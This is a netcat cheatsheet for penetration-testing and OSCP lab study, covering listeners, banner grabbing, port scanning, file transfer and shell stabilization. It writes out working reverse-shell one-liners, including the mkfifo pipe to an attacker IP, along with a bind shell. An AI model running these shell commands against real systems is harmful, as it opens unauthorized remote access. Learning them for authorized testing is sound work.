# Netcat Cheatsheet

Personal reference for penetration testing and OSCP lab work.

---

## Basic Syntax
```bash
nc [flags] [target] [port]
```

---

## Core Flags

| Flag | Purpose |
|------|---------|
| `-l` | Listen mode — wait for incoming connection |
| `-p` | Specify port number |
| `-v` | Verbose — show connection status |
| `-vv` | Very verbose |
| `-n` | No DNS resolution — use raw IPs only |
| `-u` | UDP mode instead of TCP |
| `-w <sec>` | Timeout — close connection after X seconds |
| `-z` | Zero-I/O mode — scan without sending data |
| `-e` | Execute program after connection (not available on all builds) |
| `-c` | Execute command via `/bin/sh -c` (alternative to `-e`) |

---

## Listeners

```bash
# Basic listener
nc -lvnp 443

# UDP listener
nc -lvnup 161
```

---

## Reverse Shells

```bash
# Attacker — set up listener first
nc -lvnp 4444

# Target executes one of these to connect back:

# If -e supported
nc -e /bin/bash <attacker IP> 4444

# If -c supported
nc -c /bin/bash <attacker IP> 4444

# If neither supported — use mkfifo
mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <attacker IP> 4444 > /tmp/f
```

---

## Bind Shells

```bash
# Target — opens a shell on port 4444 waiting for attacker
nc -lvnp 4444 -e /bin/bash

# Attacker — connects to target
nc <target IP> 4444
```

---

## Banner Grabbing

```bash
# Grab service banner manually
nc -nv <target IP> <port>

# Examples
nc -nv 10.10.10.4 21    # FTP banner
nc -nv 10.10.10.4 22    # SSH banner
nc -nv 10.10.10.4 80    # HTTP banner
nc -nv 10.10.10.4 25    # SMTP banner
```

---

## Port Scanning

```bash
# TCP port scan (basic)
nc -zv 10.10.10.4 1-1000

# UDP port scan
nc -zvu 10.10.10.4 1-1000

# Single port check
nc -zv 10.10.10.4 445
```

> Note: Use Nmap for scanning — nc is slower and less reliable for this purpose. Use nc for manual service interaction after Nmap identifies open ports.

---

## File Transfer

```bash
# Receiver — listen and save incoming data
nc -lvnp 4444 > received_file.txt

# Sender — send file
nc -nv <receiver IP> 4444 < file_to_send.txt

# Transfer binary files
nc -lvnp 4444 > file.exe
nc -nv <receiver IP> 4444 < file.exe
```

---

## UDP Mode

```bash
# Connect to UDP service
nc -u <target IP> 161    # SNMP
nc -u <target IP> 53     # DNS

# UDP listener
nc -lvnup 4444
```

> UDP is connectionless — no handshake confirmation. Responses may be unreliable.

---

## Common OSCP Workflows

```bash
# Step 1 — Set up listener before delivering payload
nc -lvnp 4444

# Step 2 — After getting shell, upgrade to interactive TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Then background with Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Quick port check
nc -zv 10.10.10.4 80

# Manual HTTP request via netcat
echo -e "GET / HTTP/1.0\r\n\r\n" | nc -nv 10.10.10.4 80

# SMTP user enumeration manually
nc -nv 10.10.10.4 25
# Then type: VRFY username
```

---

## -e vs -c Explained

| Flag | Mechanism | Availability |
|------|-----------|-------------|
| `-e` | Directly executes binary | Stripped from many modern Linux builds |
| `-c` | Executes via `/bin/sh -c` | More widely available than `-e` |

If neither works — use the `mkfifo` method listed under Reverse Shells above.

---

## TTY Upgrade (After Getting Shell)

Raw netcat shells are unstable — no tab completion, no Ctrl+C, commands may break. Always upgrade:

```bash
# Method 1 — Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Method 2 — Script
script /dev/null -c bash

# After either method, stabilize:
# Ctrl+Z to background
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

---

## Quick Reference

```bash
# Listener (most common — reverse shell catcher)
nc -lvnp 4444

# Banner grab
nc -nv <target> <port>

# File receive
nc -lvnp 4444 > file

# File send
nc -nv <target> 4444 < file

# Port check
nc -zv <target> <port>
```

---

*Part of Security-Shaman cybersecurity notes — github.com/Security-Shaman*
